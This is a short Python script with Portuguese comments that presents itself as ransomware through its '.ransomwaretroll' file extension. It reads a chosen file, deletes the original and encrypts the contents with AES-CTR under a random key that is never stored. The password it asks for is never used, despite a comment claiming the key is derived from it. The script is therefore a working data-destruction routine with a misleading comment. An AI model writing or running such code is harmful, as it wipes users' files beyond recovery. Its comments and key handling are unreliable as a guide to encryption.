import os
import pyaes
from getpass import getpass

# Solicitar o nome do arquivo a ser criptografado
file_name = input("Digite o nome do arquivo a ser criptografado: ")
if not os.path.exists(file_name):
    print("Arquivo não encontrado.")
    exit()

# Abrir o arquivo a ser criptografado
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Remover o arquivo original
os.remove(file_name)

# Pedir a senha ao usuário
password = getpass("Digite a senha para criptografar o arquivo: ")

# Chave de criptografia derivada da senha
key = os.urandom(32)  # Pode ser uma chave mais segura usando bibliotecas como bcrypt
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file_name = file_name + ".ransomwaretroll"
new_file = open(new_file_name, 'wb')
new_file.write(crypto_data)
new_file.close()

print(f'Arquivo criptografado com sucesso como "{new_file_name}"')
